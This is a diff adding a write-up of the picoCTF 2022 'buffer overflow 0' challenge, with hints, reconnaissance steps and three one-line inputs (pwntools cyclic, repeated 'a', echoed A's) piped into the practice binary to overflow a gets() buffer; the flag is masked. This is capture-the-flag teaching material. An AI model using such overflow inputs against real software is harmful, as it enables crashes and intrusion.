@@ -213,6 +213,45 @@ Hooray! We have a flag!
 
 ---
 
+<details>
+  <summary><h2> 4. buffer overflow 0 | 100 points ✔️ </h2></summary>
+  <h3>Description:</h3>
+  Smash the stack<br/>
+  Let's start off simple, can you overflow the correct buffer?<br/> 
+	<br/>
+  The program is available <a href=https://github.com/LogicBypass/CTF-s/raw/main/picoCTF-2022/4.buffer-overflow-0/vuln>here.</a> <br/>
+  You can view source <a href=https://github.com/LogicBypass/CTF-s/raw/main/picoCTF-2022/4.buffer-overflow-0/vuln.c>here.</a> .<br/>
+<br/>
+
+    
+  > Hint1: How can you trigger the flag to print?<br/>
+  > Hint2: If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.<br/>
+  > Hint3: Run <code>man gets</code> and read the BUGS section. How many characters can the program really read?<br/>
+
+
+  ----
+  <h3>Reconnaissance:</h3>
+  Download the files: <code>wget link-to-file</code><br/> 
+  Make it exacutable:<code>chmod +x *</code><br/>
+  Open the program's source code file and analyze it<br/>
+  Run <code>man gets</code> and read the BUGS section.<br/>
+
+
+  <h3>Exploitation:</h3>
+  Option 1:<br/>
+    <code>python -c 'from pwn import *;print(cyclic(60))' | ./vuln </code><br/>
+  Option 2:<br/>
+    <code>python -c 'print ("a"*100)' | ./vuln </code><br/>
+  Option 3:<br/>
+  <i>Python not always works as buffer overflow input, so it's a good habbit to have an alternative:</i><br/>
+    <code>(echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"; cat) | ./vuln </code><br/>
+<br/>
+  <code>picoCTF{************}</code><br/>
+Hooray! We have a flag!<br/>
+</details>
+
+---
+
  Checkmarks:
 ✔️
 ❌
